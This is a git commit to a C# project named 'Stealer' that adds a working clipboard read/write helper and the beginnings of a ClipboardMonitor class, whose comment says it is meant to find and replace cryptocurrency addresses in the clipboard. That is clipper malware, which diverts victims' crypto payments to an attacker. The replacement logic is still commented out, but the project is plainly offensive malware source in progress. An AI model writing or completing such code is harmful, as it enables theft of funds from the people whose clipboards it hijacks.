6914ce053bbcf20af22e512672d131e9b5627f2e
manolia <62712893+manolia@users.noreply.github.com>
2021-05-01 18:11:55 +0200

    Finished clipboard class and started working on the clipboard monitor class

---
+++ Stealer/Stealer/Modules/Clipboard.cs
@@ -0,0 +1,49 @@
+﻿using System.Threading;
+
+namespace Stealer.Modules
+{
+    internal sealed class Clipboard
+    {
+        // Get text from clipboard
+        public static string GetText()
+        {
+            string ReturnValue = string.Empty;
+            try
+            {
+                Thread STAThread = new Thread(
+                    delegate ()
+                    {
+                        ReturnValue = System.Windows.Forms.Clipboard.GetText();
+                    });
+                STAThread.SetApartmentState(ApartmentState.STA);
+                STAThread.Start();
+                STAThread.Join();
+            }
+            catch
+            {
+
+            }
+            return ReturnValue;
+        }
+
+        // Set text to clipboard
+        public static void SetText(string text)
+        {
+            Thread STAThread = new Thread(
+                    delegate ()
+                    {
+                        try
+                        {
+                            System.Windows.Forms.Clipboard.SetText(text);
+                        }
+                        catch
+                        {
+
+                        }
+                    });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+        }
+    }
+}
---
+++ Stealer/Stealer/Modules/Monitor.cs
@@ -0,0 +1,33 @@
+﻿using System.Collections.Generic;
+using System.Text.RegularExpressions;
+
+namespace Stealer.Modules
+{
+    internal sealed class ClipboardMonitor
+    {
+        // Previous clipboard content
+        private static string previous_buffer = "";
+
+        // Clipboard is changed
+        private static bool clipboard_change(string buffer)
+        {
+            if (buffer != previous_buffer)
+            {
+                previous_buffer = buffer;
+                return true;
+            }
+            return false;
+        }
+
+        // Find & Replace crypto addresses in clipboard
+        private static void replace_clipboard(string buffer)
+        {
+            if (string.IsNullOrEmpty(buffer))
+                return;
+            //foreach (KeyValuePair<string, Regex> dictonary in RegexPatterns.patterns)
+            //{
+            //    string cryptocurrency
+            //}
+        }
+    }
+}
